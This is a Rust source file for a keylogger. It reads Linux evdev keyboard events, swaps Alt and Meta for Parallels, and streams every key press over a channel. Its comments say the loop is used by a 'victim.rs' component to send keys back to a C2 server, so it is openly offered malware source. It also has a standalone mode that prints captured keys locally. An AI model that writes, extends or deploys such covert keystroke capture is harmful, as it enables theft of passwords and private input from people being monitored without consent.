use evdev::{Device, EventSummary, KeyCode};
use std::fs;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::io::{self, Write};
use std::sync::mpsc::{self, Sender};

#[derive(Default, Debug)]
struct Modifiers {
    shift: bool,
    ctrl: bool,
    alt: bool,
    meta: bool,
    capslock: bool,
}

impl Modifiers {
    fn update(&mut self, key: KeyCode, value: i32) {
        let pressed = value == 1;
        match key {
            KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
            KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
            KeyCode::KEY_LEFTALT | KeyCode::KEY_RIGHTALT => self.alt = pressed,
            KeyCode::KEY_LEFTMETA | KeyCode::KEY_RIGHTMETA => self.meta = pressed,
            KeyCode::KEY_CAPSLOCK if pressed => self.capslock = !self.capslock,
            _ => {}
        }
    }
}

fn find_keyboard() -> io::Result<(Device, String)> {
    let mut candidates = Vec::new();
    for entry in fs::read_dir("/dev/input")? {
        let path = entry?.path();
        if !path.to_string_lossy().contains("event") { continue; }
        if let Ok(device) = Device::open(&path) {
            let Some(keys) = device.supported_keys() else { continue; };
            if keys.contains(KeyCode::KEY_A) && keys.contains(KeyCode::KEY_ENTER) {
                candidates.push((device, path.to_string_lossy().to_string()));
            }
        }
    }
    candidates.pop().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No keyboard found"))
}

/// Swaps Alt and Meta keys for Parallels compatibility
fn parallels_remap(key: KeyCode) -> KeyCode {
    match key {
        KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
        KeyCode::KEY_RIGHTMETA => KeyCode::KEY_RIGHTALT,
        KeyCode::KEY_LEFTALT => KeyCode::KEY_LEFTMETA,
        KeyCode::KEY_RIGHTALT => KeyCode::KEY_RIGHTMETA,
        _ => key,
    }
}

/// The core loop used by victim.rs to stream keys back to C2
pub fn run_with_flag(running: Arc<AtomicBool>, tx: Sender<u8>) -> io::Result<()> {
    let (mut device, _path) = find_keyboard()?;
    
    // Non-blocking mode is critical so we can exit the loop when 'running' becomes false
    device.set_nonblocking(true)?;

    while running.load(Ordering::SeqCst) {
        match device.fetch_events() {
            Ok(events) => {
                for ev in events {
                    // Only capture key PRESSES (value 1)
                    if let EventSummary::Key(_, raw_key, 1) = ev.destructure() {
                        // Apply the Parallels remap here
                        let key = parallels_remap(raw_key);
                        
                        // Clean up the name (e.g., KEY_ENTER becomes "ENTER ")
                        let key_name = format!("{:?} ", key).replace("KEY_", "");
                        
                        // Stream each character byte over the channel to the victim's transmitter
                        for b in key_name.bytes() {
                            if tx.send(b).is_err() {
                                return Ok(()); // Stop if the receiver is gone
                            }
                        }
                    }
                }
            }
            Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                // Wait 10ms to prevent high CPU usage while idle
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

/// Standalone entry point for local testing
pub fn run() -> io::Result<()> {
    println!("=== Standalone Keylogger Mode ===");
    let running = Arc::new(AtomicBool::new(true));
    let (tx, rx) = mpsc::channel();

    // Local printing thread
    std::thread::spawn(move || {
        while let Ok(b) = rx.recv() {
            print!("{}", b as char);
            io::stdout().flush().ok();
        }
    });

    let r = running.clone();
    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl+C handler");

    run_with_flag(running, tx)
}

fn main() -> io::Result<()> {
    run()
}
